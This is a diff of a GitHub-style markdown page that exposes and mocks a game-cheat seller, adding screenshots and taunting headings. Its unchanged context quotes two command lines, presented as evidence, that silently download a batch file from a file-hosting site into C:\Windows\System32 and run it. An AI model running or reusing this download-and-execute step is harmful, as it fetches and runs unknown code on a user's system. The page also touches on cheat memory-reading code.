@@ -53,6 +53,13 @@ void OverlayRender()
 }
 ```
 
+<img width="581" height="632" alt="image" src="https://github.com/user-attachments/assets/f6be40f4-7bdf-4ab6-9dbd-16b105f11c54" />
+
+### blocked me after i exposed him
+<img width="1646" height="185" alt="image" src="https://github.com/user-attachments/assets/d29ce434-902d-42b4-a823-4412cdee71a7" />
+
+### i dont even know what to label this as lmao
+<img width="593" height="609" alt="image" src="https://github.com/user-attachments/assets/e89a805b-4c50-4568-bca6-ad5518f88817" />
 
 ### proof of sofmain driver
 ```cpp
@@ -83,11 +90,30 @@ as you see it shows as `GetProcessAddress(... "NtUnloadDriver");` just like the 
 - cd C:\\Windows\\System32\\ && clean.bat
 - curl --silent https://files.catbox.moe/ykmoac.bat --output C:\\Windows\\System32\\clean.bat >nul 2>&1
 
+### UD cheat but doesnt understand how the ac works nor the serversided checks?!!
+
+<img width="482" height="29" alt="image" src="https://github.com/user-attachments/assets/6398efbe-01aa-459d-ad92-036247c16656" />
 
 ### doesn't understand basic c++ concepts
+
 <img width="1219" height="660" alt="uintptr_t pos_ptr = readuintptr_t(player_base + offsetspos); float x = readfloat(pos_ptr + 0x0); float y = readfloat(pos_ptr + 0x4); float z = readfloat(pos_ptr + 0x8);" src="https://github.com/user-attachments/assets/dfaf063e-2fdf-4c8a-8bc5-c89aefce2299" />
 
 ### doesnt know how UE works?!?!?
 
 <img width="700" height="175" alt="image" src="https://github.com/user-attachments/assets/3e9fcae4-3a65-4519-9206-0e1e7383ebb6" />
+
+### "ud driver made it to unreal"
+
+<img width="744" height="155" alt="image" src="https://github.com/user-attachments/assets/27e3f854-78c0-4230-9361-74ff1c67f0eb" />
+
+
+<img width="567" height="177" alt="image" src="https://github.com/user-attachments/assets/c61db16c-683d-40ae-99ec-a2c2575d2118" />
+
+
+<img width="256" height="18" alt="image" src="https://github.com/user-attachments/assets/32172ce2-8827-4192-8acb-2420bd347f90" />
+
+#### "bought it"
+
+<img width="400" height="20" alt="image" src="https://github.com/user-attachments/assets/0aeba919-afd4-4a3a-9c66-16e8a7953da3" />
+
 
